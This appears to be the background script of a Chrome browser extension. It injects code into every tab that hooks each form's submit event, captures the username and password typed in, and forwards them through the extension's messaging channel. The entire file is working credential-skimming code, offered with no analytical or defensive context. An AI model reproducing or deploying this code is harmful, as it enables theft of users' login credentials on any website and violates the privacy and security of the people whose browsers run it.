chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (tab.status != "loading") {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: injectFindAndSendEvent
        });
    }
});

const injectFindAndSendEvent = () => {
    var forms = document.forms;
    var loginData = {
        username: "",
        password: ""
    }

    Array.prototype.forEach.call(forms, form => {
        form.addEventListener("submit", function () {
            Array.prototype.forEach.call(form.elements, element => {
                if (element.type == "text" && loginData.username == "" && loginData.password == "") {
                    loginData.username = element.value;
                }
                if (element.type == "password" && loginData.password == "") {
                    loginData.password = element.value;
                }
            });
            chrome.runtime.sendMessage({ loginData });
        });
    });
}